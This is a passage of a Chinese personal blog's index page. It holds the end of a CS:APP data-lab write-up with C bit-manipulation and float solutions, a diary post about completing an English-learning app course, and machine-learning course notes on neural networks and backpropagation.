<span class="number">4</span>);</span><br><span class="line">  shift3 = sign &lt;&lt; <span class="number">2</span>;</span><br><span class="line">  x = x &gt;&gt; shift3;</span><br><span class="line"></span><br><span class="line">  sign = !!(x &gt;&gt; <span class="number">2</span>);</span><br><span class="line">  shift4 = sign &lt;&lt; <span class="number">1</span>;</span><br><span class="line">  x = x &gt;&gt; shift4;</span><br><span class="line"></span><br><span class="line">  sign = !!(x &gt;&gt; <span class="number">1</span>);</span><br><span class="line">  shift5 = sign;</span><br><span class="line">  x = x &gt;&gt; shift5;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> shift1 + shift2 + shift3 + shift4 + shift5;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>感觉代码要比我的文字清晰易读多了。</p>
<h3 id="float-neg"><a href="#float-neg" class="headerlink" title="float_neg"></a>float_neg</h3><ul>
<li>要求：f 为浮点数的位级表示，返回<code>-f</code>的位级表示，如果 f 为 NaN，返回 f</li>
<li>允许操作：允许所有有/无符号数的操作，并允许使用 if 和 while</li>
<li>操作数限制：10</li>
</ul>
<p>浮点数使用 <a href="https://en.wikipedia.org/wiki/IEEE_floating_point" target="_blank" rel="noopener">IEEE754</a>标准，单精度的浮点数中有 1 位符号位，8 为指数位和 23 位小数位。</p>
<p><img src="/images/2017-3-12/14893087870697.png" alt=""></p>
<p>所以当 <code>f</code> 不为 NaN 时，要返回<code>-f</code>，只需要将符号位取反即可；判断 f 是否为 NaN 则要判断指数位是否为全 1，并且小数为不为全 0。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="title">float_neg</span><span class="params">(<span class="keyword">unsigned</span> uf)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> exp_mask = <span class="number">0xff</span> &lt;&lt; <span class="number">23</span>;</span><br><span class="line">  <span class="keyword">if</span> ((!((uf &amp; exp_mask) ^ exp_mask)) &amp;&amp; (uf &amp; ((<span class="number">1</span> &lt;&lt; <span class="number">23</span>) + (~<span class="number">0</span>)))) &#123;</span><br><span class="line">    <span class="keyword">return</span> uf;</span><br><span class="line">  &#125;  <span class="keyword">return</span> (uf ^ (<span class="number">0x1</span> &lt;&lt; <span class="number">31</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="float-i2f"><a href="#float-i2f" class="headerlink" title="float_i2f"></a>float_i2f</h3><ul>
<li>要求：返回整数 x 的浮点数的位级表示</li>
<li>允许操作：允许所有有/无符号数的操作，并允许使用 if 和 while</li>
<li>操作数限制：30</li>
</ul>
<p>讲真，最开始做这个题目的时候我的大脑是一片混乱的，因为要处理的细节很多：舍入、指数位增加偏移量等。最终我参考了<a href="http://wdxtub.com/2016/04/16/thick-csapp-lab-1/" target="_blank" rel="noopener">小土刀</a>的答案，才基本理清了思路。</p>
<p>要返回的答案，需要组合浮点数三部分(符号位、指数位和小数位)，即<br><code>(sign &lt;&lt; 31) | (exponent) &lt;&lt; 23 | fraction</code>。</p>
<ol>
<li>当 x = 0 时，返回 0</li>
<li>当 x = 0x80000000 时，令 exponent = 158，因为 158 - 127 = 31，其中 Bias = $2^{n-1} - 1$</li>
<li>如果 x &lt; 0, 则 sign = 1；并令 x = -x，这样之后在做移位等操作就不用担心符号位了</li>
<li>计算整数 x 的位数，作为计算 exponent 的依据</li>
<li>得到 exponent 后，将 x 右移计算小数值 fraction，并且根据移除的值是否大于等于1.5来判断是否要进位，从而实现向零舍入</li>
<li>如果小数位过多，则丢弃最高位并增加 exponent</li>
<li>组合符号位、指数位和小数位</li>
</ol>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="title">float_i2f</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">int</span> sign = (x &gt;&gt; <span class="number">31</span>) &amp; <span class="number">0x1</span>;</span><br><span class="line">  <span class="keyword">int</span> i;</span><br><span class="line">  <span class="keyword">int</span> exponent = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">int</span> fraction = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">int</span> delta = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">int</span> fraction_mask;</span><br><span class="line">  <span class="keyword">if</span> (x == <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> x;</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span> (x == <span class="number">0x80000000</span>) &#123;</span><br><span class="line">    exponent = <span class="number">158</span>;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (sign) &#123;</span><br><span class="line">      x = -x;</span><br><span class="line">    &#125;</span><br><span class="line">    i = <span class="number">30</span>;</span><br><span class="line">    <span class="keyword">while</span> ( !(x &gt;&gt; i) ) &#123;</span><br><span class="line">      i --;</span><br><span class="line">    &#125;</span><br><span class="line">    exponent = i + <span class="number">127</span>;</span><br><span class="line"></span><br><span class="line">    x = x &lt;&lt; (<span class="number">31</span> - i);</span><br><span class="line">    fraction_mask = <span class="number">0x7fffff</span>;</span><br><span class="line">    fraction = fraction_mask &amp; (x &gt;&gt; <span class="number">8</span>);</span><br><span class="line">    x = x &amp; <span class="number">0xff</span>;</span><br><span class="line">    delta = x &gt; <span class="number">128</span> || ((x == <span class="number">128</span>) &amp;&amp; (fraction &amp; <span class="number">0x1</span>));</span><br><span class="line">    fraction += delta;</span><br><span class="line">    <span class="keyword">if</span> (fraction &gt;&gt; <span class="number">23</span>) &#123;</span><br><span class="line">      fraction &amp;= fraction_mask;</span><br><span class="line">      exponent += <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> (sign &lt;&lt; <span class="number">31</span>) | (exponent &lt;&lt; <span class="number">23</span>) | fraction;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="float-twice"><a href="#float-twice" class="headerlink" title="float_twice"></a>float_twice</h3><ul>
<li>要求：返回 2 * f 的位级表示，f 为浮点数 f 的位级表示</li>
<li>如果 f 为 NaN 则返回 f</li>
<li>允许操作：允许所有有/无符号数的操作，并允许使用 if 和 while</li>
<li>操作数限制：30</li>
</ul>
<p>我们可以针对不同的情况来操作：</p>
<ol>
<li>若 f 为<code>+0</code>或<code>-0</code>，返回 f</li>
<li>若 f 为无穷大或 NaN，返回 f</li>
<li>若 f 为非规格化浮点数，则保留符号位，并将 f 左移1位</li>
<li>若 f 为规格化浮点数，则将 f 的指数位增加1</li>
</ol>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="title">float_twice</span><span class="params">(<span class="keyword">unsigned</span> uf)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (uf == <span class="number">0</span> || uf == <span class="number">0x80000000</span>) &#123; <span class="keyword">return</span> uf; &#125;</span><br><span class="line">  <span class="keyword">if</span> (((uf &gt;&gt; <span class="number">23</span>) &amp; <span class="number">0xff</span>) == <span class="number">0xff</span>) &#123; <span class="keyword">return</span> uf; &#125;</span><br><span class="line">  <span class="keyword">if</span> (((uf &gt;&gt; <span class="number">23</span>) &amp; <span class="number">0xff</span>) == <span class="number">0x00</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> (uf &amp; (<span class="number">0x1</span> &lt;&lt; <span class="number">31</span>)) | (uf &lt;&lt; <span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> uf + (<span class="number">1</span> &lt;&lt; <span class="number">23</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="最终结果"><a href="#最终结果" class="headerlink" title="最终结果"></a>最终结果</h2><p>代码规范检查：<br><img src="/images/2017-3-12/dlc.png" alt="dl"></p>
<p>代码结果检查：</p>
<p><img src="/images/2017-3-12/btest.png" alt="btest"></p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://chuanleiguo.com/2017/03/02/%E8%8B%B1%E8%AF%AD%E5%AD%A6%E4%B9%A0%E7%9A%84%E5%B0%8F%E9%87%8C%E7%A8%8B%E7%A2%91/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="Chuanlei Guo">
      <meta itemprop="description" content="正因为未知，人与人之间的羁绊才愈发迷人">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Chuan's Cabin">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2017/03/02/%E8%8B%B1%E8%AF%AD%E5%AD%A6%E4%B9%A0%E7%9A%84%E5%B0%8F%E9%87%8C%E7%A8%8B%E7%A2%91/" class="post-title-link" itemprop="url">英语学习的小里程碑</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2017-03-03 01:36:23" itemprop="dateCreated datePublished" datetime="2017-03-03T01:36:23+08:00">2017-03-03</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2020-06-28 17:41:58" itemprop="dateModified" datetime="2020-06-28T17:41:58+08:00">2020-06-28</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/diary/" itemprop="url" rel="index"><span itemprop="name">日志</span></a>
                </span>
            </span>

          
  
  <span class="post-meta-item">
    
      <span class="post-meta-item-icon">
        <i class="far fa-comment"></i>
      </span>
      <span class="post-meta-item-text">Disqus：</span>
    
    <a title="disqus" href="/2017/03/02/%E8%8B%B1%E8%AF%AD%E5%AD%A6%E4%B9%A0%E7%9A%84%E5%B0%8F%E9%87%8C%E7%A8%8B%E7%A2%91/#disqus_thread" itemprop="discussionUrl">
      <span class="post-comments-count disqus-comment-count" data-disqus-identifier="2017/03/02/英语学习的小里程碑/" itemprop="commentCount"></span>
    </a>
  </span>
  
  

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>这个月我达成了自己英语学习的一个小里程碑—英语流利说180天达标退费。</p>
<p><img src="/images/2017-3-3/IMG_2195.PNG" alt="image"><br>学习英语是我2016年的重要计划，我从元旦开始坚持每天学习英语，主要是通过传统的方法：背单词。坚持两个月之后我觉得这种方法非常低效，自己完全不知道每个单词的语境是什么，怎样使用。而且最重要的是，背单词对我的口语几乎没有任何帮助。</p>
<p>后来在刷微博的时候无意间发现了「英语流利说」这款应用，使用之后觉得很不错。我从二月份开始使用「英语流利说」练习口语，也陆续得购买了一些收费课程，如「赖世雄美语中级教程」。这些课程的优点在于可以用不同颜色标记用户的发音准确程度，并可以显示某个单词的发音方法。使用三个月之后，我感觉自己哑巴英语略有提高，但进步有限。我知道真功夫是不能速成的，所以我也没有着急并在坚持学习。</p>
<p>后来在6月份在App里测试了自己的口语水平得到 level 3 之后，被推荐了「懂你英语」课程。它号称可以让用户在6个月讲一口流利的英语，无障碍参加英语面试。我抱着尝鲜的心态购买了一个月。</p>
<p>「懂你英语」课程的使用体验给我留下了深刻的印象，它通过先听再让用户复述，并附带练习题目的方式让用户学习，而不是简单地朗读文本。这种方式除了对口语提升明显外，也能锻炼听力，因为用户不得不听清楚每个单词、表达以及语法之后才能正确地复述并答对题目。</p>
<p>所以在试用一个月之后，我毫不犹豫得参加了「懂你英语180天」套餐。在用户坚持学习180年并达到相应标准后，流利说就会给用户退回购买「懂你英语」课程的费用—499元。</p>
<p>之后我就开始了漫长了练习过程。因为自己过去十几年的英语学习完全是失败的，学会的是哑巴英语。我的口语力几乎为零。所以在半年的学习过程中，在无法正确复述原句的时候，在无法答对题目的时候，我无数次的想要砸手机，非常痛苦。</p>
<p>不过，最终我的口语能力还是取得了明显的进步。我从 level 3 一直进阶到了现有的最高等级— level 6，并且拿到了满星，最终实现了退费。在现实生活中，我也感觉到了自己英语的进步，我现在可以无障碍的和老外交流（当然，对话内容不复杂^_^），在学校也顺利地完成了接待外宾的任务。</p>
<p>最后，我也想吐槽下「英语流利说」这款应用。首先在学习「懂你英语」是App非常不稳定，进场出现闪退的情况；第二，使用这款App时手机的发热量非常高，我的iPhone 6在服役半年之后，就光荣得因为电池续航问题退役了；第三，也是最让我不满的就是「懂你英语」的课程更新速度非常慢，我在2016年8月份完成了 level 5的学习，可是 level 6的内容直到12月才推出。而 level 7 和 level 8的内容到现在也还没有任何音讯。</p>
<p>经过半年的版本迭代，App本身的闪退和耗电量巨大的问题有了明显好转，但是课程更新速度慢的问题还是没有解决，期待推出 level 7和 level 8 的课程。</p>
<p>总之，「懂你英语」是一款非常优秀的应用，推荐大家学习。</p>
<p>英语能力是一种自由。</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://chuanleiguo.com/2017/01/10/Neural-Networks/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="Chuanlei Guo">
      <meta itemprop="description" content="正因为未知，人与人之间的羁绊才愈发迷人">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Chuan's Cabin">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2017/01/10/Neural-Networks/" class="post-title-link" itemprop="url">【机器学习课程笔记】| Neural Networks</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2017-01-10 09:26:23" itemprop="dateCreated datePublished" datetime="2017-01-10T09:26:23+08:00">2017-01-10</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2020-06-28 17:41:58" itemprop="dateModified" datetime="2020-06-28T17:41:58+08:00">2020-06-28</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/mooc/" itemprop="url" rel="index"><span itemprop="name">MOOC</span></a>
                </span>
            </span>

          
  
  <span class="post-meta-item">
    
      <span class="post-meta-item-icon">
        <i class="far fa-comment"></i>
      </span>
      <span class="post-meta-item-text">Disqus：</span>
    
    <a title="disqus" href="/2017/01/10/Neural-Networks/#disqus_thread" itemprop="discussionUrl">
      <span class="post-comments-count disqus-comment-count" data-disqus-identifier="2017/01/10/Neural-Networks/" itemprop="commentCount"></span>
    </a>
  </span>
  
  

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="非线性假设（Non-Linear-Hypotheses）"><a href="#非线性假设（Non-Linear-Hypotheses）" class="headerlink" title="非线性假设（Non-Linear Hypotheses）"></a>非线性假设（Non-Linear Hypotheses）</h1><p>使用非线性的多项式可以帮助我们建立更好的分类模型。加入我们使用100个特征来构建一个非线性多项式模型，即使我们仅仅采用两两组合的方法，那么结果也将有超过5000个组合而成的模型，这对于一般的逻辑回归来说需要计算的特征太多了。</p>
<p>正是因为普通的逻辑回归不能很好地处理这么多特征，所以我们需要使用神经网络。</p>
<h1 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h1><p>神经网络是由具有适应性的简单单元组成的广泛并行互联的网络，它的组织能够模拟生物神经系统对真实世界物体所作出的交互反应。</p>
<h1 id="神经网络的表示"><a href="#神经网络的表示" class="headerlink" title="神经网络的表示"></a>神经网络的表示</h1><p>神经网络中最基本的处理单元被称为神经元（Neuron），它包含多个输入，和一个输出。我们也可以将每个神经元当做一个学习单元，每个单元均采纳多个特征作为输入，并根据本身的模型得到一个输出。将多个神经元按照一定层次组合起来，就得到了神经网络（Neural Network）。一个以逻辑回归模型作为自身学习模型的神经元可以用下图表示，其中的参数可称为“权重（Weight）”。</p>
<p><img src="/images/2017-1-18/Artboard.png" alt="Artboard"></p>
<p>$$ h_\theta(x)=\frac{1}{1+e^{-\theta^{T}x}} $$</p>
<p>神经网络是许多逻辑单元按照不同层次组织起来的网络，每一层的输出变量是下一层的输出变量。以三层神经网络为例，第一层为输入层（Input Layer），中间一层为隐藏层（Hidden Layers），最后一层为输出层（Output Layer）。</p>
<p><img src="/images/2017-1-18/Artboard1.png" alt="Artboard1"></p>
<p>对于上图的模型，激活单元和输出分别表达为：</p>
<p>$$a_1=g(\theta_{10}x_0 +\theta_{11}x_1+\theta_{12}x_2+\theta_{13}x_3)$$<br>$$a_2=g(\theta_{20}x_0 +\theta_{21}x_1+\theta_{22}x_2+\theta_{23}x_3)$$<br>$$a_3=g(\theta_{30}x_0 +\theta_{31}x_1+\theta_{32}x_2+\theta_{33}x_3)$$<br>$$h_{\theta}(x)=g(\theta_{10}^{(2)}a_0+\theta_{11}^{(2)}a_1+\theta_{12}^{(2)}a_2+\theta_{13}^{(2)}a_3)$$</p>
<h2 id="正向传播（Forward-Propagation）"><a href="#正向传播（Forward-Propagation）" class="headerlink" title="正向传播（Forward Propagation）"></a>正向传播（Forward Propagation）</h2><p>我们可以使用向量化的方法来计算神经网络的值：</p>
<p>$$g\Bigg( \begin{bmatrix}<br>\theta_{10}^{(1)} &amp; \theta_{11}^{(1)} &amp; \theta_{12}^{(1)} &amp; \theta_{13}^{(1)} \\<br>\theta_{20}^{(1)} &amp; \theta_{21}^{(1)} &amp; \theta_{22}^{(1)} &amp; \theta_{23}^{(1)} \<br>\theta_{30}^{(1)} &amp; \theta_{31}^{(1)} &amp; \theta_{32}^{(1)} &amp; \theta_{33}^{(1)}<br>\end{bmatrix} \times \begin{bmatrix}<br>x_0 \\ x_1 \\ x_2 \\ x_3<br>\end{bmatrix}\Bigg) = g\Bigg( \begin{bmatrix}<br>\theta_{10}^{(1)}x_0 + \theta_{11}^{(1)}x_1 + \theta_{12}^{(1)}x_2 + \theta_{13}^{(1)}x_3 \<br>\theta_{20}^{(1)}x_0 + \theta_{21}^{(1)}x_1 + \theta_{22}^{(1)}x_2 + \theta_{23}^{(1)}x_3 \<br>\theta_{30}^{(1)}x_0 + \theta_{31}^{(1)}x_1 + \theta_{32}^{(1)}x_2 + \theta_{33}^{(1)}x_3<br>\end{bmatrix}\Bigg) = \begin{bmatrix}<br>a_1^{(2)} \\ a_2^{(2)} \\ a_3^{(2)}<br>\end{bmatrix}$$</p>
<p>本质上讲，神经网络能够通过学习得出其自身的一系列特征。在普通的逻辑回归中，我们被限制为使用数据中的原始特征$x_1, x2,\dots,x_n$，我们虽然可以使用一些二项式组合来组合这些特征，但是我们仍然受到这些原始特征的限制。在神经网络中，原始特征只是输入层，第三层也就是输出层做出的预测利用的是第二层的特征，而非输入层的原始特征，我们可以认为第二层中的特征是神经网络通过学习后自己得出的一系列用于预测输出变量的特征。</p>
<h2 id="感知机与多层网络"><a href="#感知机与多层网络" class="headerlink" title="感知机与多层网络"></a>感知机与多层网络</h2><p>感知机（Perceptron）由两层神经元组成，输入层接收外界输入信号后传递给输出层，输出层是M-P神经元，亦称“阈值逻辑单元”。我们可以使用感知机来实现与、或、非运算。</p>
<ul>
<li>“与”（$x_1 \wedge x_2$）：令$\theta_0=-30, \theta_1=20, \theta_1=20$</li>
<li>“或”（$x_1 \vee x_2$）：令$\theta_0=-10, \theta_1=20, \theta_1=20$</li>
<li>“非”（$\neg x_1$）：令$\theta_0=10, \theta_1=-20$</li>
</ul>
<p>我们也可以利用组合神经元来组合成为更为复杂的神经网络以实现更复杂的运算，我们也可以使用多层神经网络来实现多分类任务。</p>
<h1 id="参数学习"><a href="#参数学习" class="headerlink" title="参数学习"></a>参数学习</h1><h2 id="代价函数"><a href="#代价函数" class="headerlink" title="代价函数"></a>代价函数</h2><p>在逻辑回归中，我们的代价函数定义为：</p>
<p>$$J(\theta)=-[\frac{1}{m}\sum_{i=1}^{m}(y^{(i)} \times log(h_{\theta}(x^{(i)}))+(1-y^{(i)}) \times log(1-h_{\theta}(x^{(i)})))]+\frac{\lambda}{2m}\sum_{j=1}^{m}\theta_{j}^{2}$$</p>
<p>在逻辑回归中，我们只有一个输出变量，又称标量（scalar），也只有一个因变量y，但是在神经网络中，我们可以有很多输出变量，我们的$h_\theta(x)$是一个维度为K的向量，而且我们训练集中的因变量也是同样维度的一个向量，因此我们的代价函数会比逻辑回归更加复杂一些，为：</p>
<p>$$J(\theta)=-\frac{1}{m}\Big[\sum_{i=1}^{m}\sum_{k=1}^{K}y_k^{(i)}log(h_{\theta}(x^{(i)}))_k + (1-y_k^{(i)})log(1-(h_{\theta}(x^{(i)}))_k)\Big]+\frac{\lambda}{2m}\sum_{l=1}^{L-1}\sum_{i=1}^{s_l}\sum_{j=1}^{s_j+1}(\theta_{ji}^{(l)})^2$$</p>
<p>这个看起来复杂很多的代价函数背后的思想还是一样的，我们希望通过代价函数来观察算法预测的结果与真是情况的误差有多大，唯一不同的是，对于每一行特征，我们都会给出K个预测。我们可以对每一行特征都预测K个不同结果，然后再利用循环在K个预测中选择可能性最高的一个，将其与y中的实际数据进行比较。</p>
<h2 id="反向传播算法（Back-Propagation）"><a href="#反向传播算法（Back-Propagation）" class="headerlink" title="反向传播算法（Back Propagation）"></a>反向传播算法（Back Propagation）</h2><p>在正向传播算法中，我们从第一层开始正向一层层进行计算，知道最后一层的$h_\theta(x)$。</p>
<p>现在为了计算代价函数的偏导数$\frac{\partial}{\partial\theta_{ij}^{(i)}}J(\theta)$，我们需要采用反向传播算法，就是首先计算最后一层的误差，然后再一层一层反向求出各层的误差，直到倒数第二层。</p>
<p>我们以一个四层的神经网络为例，最后一层的误差是激活单元的预测$a_{k}^{(4)}$与实际值$y_k$之间的误差。我们中$\delta$来表示：<br>$$\delta^{(4)}=a^{(4)}-y$$<br>我们利用这个误差值来计算前一层的误差：</p>
<p>$${\delta}^{(3)}=({\theta}^{(3)})^{T}{\delta}^{(4)}.*g’(z^{(3)})$$</p>
<p>其中$g’(z^{(3)})$是S形函数的导数，<br>$g’(z^{(3)})=a^{(3)}.*(1-a^{(3)})$。而$(\theta^{(3)})^{T}\delta^{(4)}$<br>则是权重导致的误差的和。下一步继续计算第二层的误差：</p>
<p>$$\delta^{(2)}=(\theta^{(2)})^{T}\delta^{(3)}.*g’(z^{(2)})$$</p>
<p>因为第一层是输入变量，不存在误差。我们有了所有的误差的表达式后，便可以计算代价函数的偏导数。假设我们不做任何归一化处理：</p>
<p>$$\frac{\partial}{\partial\theta_{ij}^{(l)}}J(\theta)=a_{j}^{l}\delta_{i}^{l+1}$$</p>
<p>反向传播算法的过程可以表述为：</p>
<p>有训练集${(x^{(1)}, y^{(1)}),\dots,(x^{(m)}, y^{(m)})}$</p>
<ul>
<li>对于所有的$(l,i,j)$，设置$\delta_{ij}^{(l)}=0$<br>for traing_example t = 1 to m:</li>
<li>$a^{(l)}=x^{(t)}$</li>
<li>使用FP来计算$a^{(l)}$</li>
<li>$\delta^{l} = a^{(l)} - y^{(t)}$</li>
<li>$D_{i,j}=\frac{1}{m}(\delta_{ij}^{(l)}+\lambda\theta_{ij}^{(l)})$</li>
</ul>
<h2 id="梯度检验"><a href="#梯度检验" class="headerlink" title="梯度检验"></a>梯度检验</h2><p>当我们对一个较为复杂的模型（例如神经网络）使用梯度下降算法时，可能会存在一些不容易察觉的错误，意味着，虽然代价看上去在不断减小，但最终的结果可能不是最优解。</p>
<p>为了避免这样的问题，我们采用一种叫做<strong>梯度数值检验</strong>（Numerical Gradient Checking）方法。这种方法的思想是通过估计梯度值来检验我们计算的导数值是否真的是我们要求的。</p>
<p>对梯度的估计采用的方法是在代价函数上沿着切线的方向选择离两个点非常近的点然后计算两个点的平均值用以估计梯度。即对于某个特定的$\theta$，我们计算出在$\theta-\varepsilon$和$\theta+\varepsilon$的代价值，然后求两个代价的平均，用以估计在$\theta$处的代价值。</p>
<h2 id="随机初始化"><a href="#随机初始化" class="headerlink" title="随机初始化"></a>随机初始化</h2><p>任何优化算法都需要一些初始的参数。到目前为止我们都是初始所有参数为0，这样的初始方法对于逻辑回归来说是可行的，但是对神经网络来说是不可行的。如果我们令所有的初始参数都为零，这意味着我们第二层的所有激活单元都会有相同的值。同理，如果我们初始所有的参数都为一个非0的数，结果也是一样的。</p>
<p>所以，我们通常初始参数为正负$\varepsilon$之间的随机值。</p>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>我们在使用神经网络时，第一件要做的事情就是要选择网络结构，即决定选择多少层以及决定每层分别有多少个单元。</p>
<ul>
<li>第一层的单元数既是我们训练集的特征数量</li>
<li>最后一层的单元数是我们训练集的结果的类的数量</li>
<li>如果隐藏层数大于1，确保每个隐藏层的单元个数相同，通常情况下隐藏层单元的个数越多越好</li>
</ul>
<p>训练神经网络的步骤为：</p>
<ol>
<li>参数的随机初始化</li>
<li>利用正向传播方法计算所有的$h_{\theta}(x)$</li>
<li>编写计算代价函数$J$的代码</li>
<li>利用反向传播方法计算所有偏导数</li>
<li>利用数值检验方法检验这些偏导数</li>
<li>利用优化算法来最小化代价函数</li>
</ol>
<h1 id="深度学习（Deep-Learning）"><a href="#深度学习（Deep-Learning）" class="headerlink" title="深度学习（Deep Learning）"></a>深度学习（Deep Learning）</h1><p>一般来说，参数越多的模型复杂度越高、“容量”越大，能完成更复杂的学习任务。很深层的神经网络学习模型被称为深度学习模型。对神经网络模型，提高容量的方法就是增加隐藏层的数目。隐藏层多了，相应的神经元连接权、阈值等参数也就越多。然而，多隐层神经网络难以直接用BP算法进行训练，因为误差在多隐层内逆传播时，往往会“发散”而不能收敛到稳定状态。</p>
<p>无监督逐层训练（Unsupervised Layer-wise Training）是多隐层网络训练的有效手段，其基本思想是每次训练一层隐节点，训练时将上一层隐节点的输出作为输入，而本层隐节点的输出作为下一层隐节点的输入，这称为“预训练”；在训练完成之后，再对整个网络进行“微调”训练。</p>
<p>“预训练+微调”的做法可视为将大量参数分组，对每组先找到局部看起来比较好的设置，然后在基于这些局部较优的结果联合起来进行全局寻优。这样就在利用了模型大量参数所提供的自由度的同时，有效节省了训练开销。</p>
<p>另一种节省开销的策略是“权值共享”（weight sharing），即让一组神经元使用相同的连接权。这个策略在卷积神经网络（Convolutional Neural Network）中发挥了重要作用。</p>
<p>总的来说，深度学习是通过多层处理，逐渐将初始的“底层”特征表示转化为“高层”特征表示后，用“简单模型”即可完成复杂的分类等学习任务。由此，我们可以将深度学习理解为进行“特征学习”或表示学习。</p>
<h1 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h1><ol>
<li><a href="https://www.amazon.cn/%E5%9B%BE%E4%B9%A6/dp/B01ARKEV1G" target="_blank" rel="noopener">机器学习</a> 周志华</li>
<li><a href="https://www.coursera.org/learn/machine-learning/home" target="_blank" rel="noopener">Machine Learning</a> Stanford</li>
</ol>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://chuanleiguo.com/2017/01/01/Logistic-Regression/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="Chuanlei Guo">
      <meta itemprop="description" content="正因为未知，人与人之间的羁绊才愈发迷人">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Chuan's Cabin">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2017/01/01/Logistic-Regression/" class="post-title-link" itemprop="url">【机器学习课程笔记】| Logistic Regression</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
